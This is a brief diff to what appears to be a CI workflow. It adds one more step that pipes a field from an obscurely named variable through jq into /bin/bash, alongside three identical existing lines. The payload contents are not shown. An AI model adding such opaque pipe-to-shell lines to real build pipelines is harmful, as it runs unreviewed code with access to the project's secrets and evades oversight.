@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$vroy30715" | jq -r .oc8825 | /bin/bash
           echo $uyg1 | jq -r .a080 | /bin/bash
           echo $krh888 | jq -r .e0700 | /bin/bash
+          echo $xuc010 | jq -r .caat13608 | /bin/bash
 
       - name: Archive output
         if: always()
